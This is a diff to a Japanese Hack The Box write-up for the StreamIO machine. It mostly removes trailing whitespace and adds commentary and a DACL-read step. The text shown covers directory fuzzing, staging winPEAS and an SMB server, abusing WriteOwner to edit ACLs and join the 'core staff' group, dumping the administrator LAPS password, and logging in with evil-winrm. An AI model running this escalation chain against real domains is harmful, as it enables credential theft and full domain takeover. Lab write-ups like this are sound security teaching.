@@ -61,7 +61,7 @@ hosts編集
 列挙  
 すべて403だが、adminのみレスポンスサイズが小さいね
 ```sh
-└─$ ffuf -r  -u https://streamio.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+└─$ ffuf -r -u https://streamio.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -953,7 +953,7 @@ winpeasを配送
 ```sh
 └─$ cp /usr/share/peass/winpeas/winPEASx64.exe .
 
-└─$ python3.13 -m http.server 80                                                                                            
+└─$ python3.13 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 ブラウザ情報を確認すると、firefoxのdbファイルを発見  
@@ -1085,7 +1085,7 @@ Error while getting Win32_UserAccount info: System.Management.ManagementExceptio
 ```
 ファイル転送のため、kaliにsmbサーバをたてる
 ```sh
-└─$ impacket-smbserver -smb2support share .                                                                                                   
+└─$ impacket-smbserver -smb2support share .
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Config file parsed
@@ -1215,9 +1215,21 @@ LDAP        10.129.62.39    389    DC               Done in 01M 36S
 LDAP        10.129.62.39    389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.62.39_2025-11-22_014504_bloodhound.zip
 ```
 jdgoddのwriteownerであるグループは、LAPSを使用できるみたい  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_14.png">
-まずはaclを編集、
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_14.png">  
+まずはグループにユーザを追加するためにaclを編集
 ```sh
+└─$ impacket-dacledit -ts -dc-ip 10.129.62.39 -principal 'jdgodd' -target 'core staff' -action read 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[2025-11-22 02:16:00] [*] Parsing DACL
+[2025-11-22 02:16:00] [*] Printing parsed DACL
+[2025-11-22 02:16:00] [*] Filtering results for SID (S-1-5-21-1470860369-1569627196-4264678630-1104)
+[2025-11-22 02:16:00] [*]   ACE[2] info                
+[2025-11-22 02:16:00] [*]     ACE Type                  : ACCESS_ALLOWED_ACE
+[2025-11-22 02:16:00] [*]     ACE flags                 : None
+[2025-11-22 02:16:00] [*]     Access mask               : WriteOwner (0x80000)
+[2025-11-22 02:16:00] [*]     Trustee (SID)             : JDgodd (S-1-5-21-1470860369-1569627196-4264678630-1104)
+
 └─$ impacket-dacledit -ts -dc-ip 10.129.62.39 -principal 'jdgodd' -target 'core staff' -action write -rights WriteMembers 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -1243,8 +1255,9 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [2025-11-22 02:16:57] [*]     Access mask               : WriteOwner (0x80000)
 [2025-11-22 02:16:57] [*]     Trustee (SID)             : JDgodd (S-1-5-21-1470860369-1569627196-4264678630-1104)
 ```
+自身をグループに追加
 ```sh
-└─$ impacket-net 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r@10.129.62.39' group -name 'core staff' -join jdgodd                                                     
+└─$ impacket-net 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r@10.129.62.39' group -name 'core staff' -join jdgodd
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Adding user account 'jdgodd' to group 'core staff'
@@ -1255,6 +1268,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
   1. JDgodd
 ```
+laps経由でadministratorのパスワードを確認！
 ```sh
 └─$ impacket-GetLAPSPassword -ts -dc-ip 10.129.62.39 'streamio.htb/jdgodd:JDg0dd1s@d0p3cr3@t0r'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -1263,6 +1277,8 @@ Host  LAPS Username  LAPS Password   LAPS Password Expiration  LAPSv2
 ----  -------------  --------------  ------------------------  ------
 DC$   N/A            r{67YYWc6T3e2I  2025-11-23 08:33:54       False
 ```
+winrmでログイン成功  
+ルートフラグゲット！
 ```powershell
 └─$ evil-winrm -i 10.129.62.39 -u administrator -p 'r{67YYWc6T3e2I'
                                         
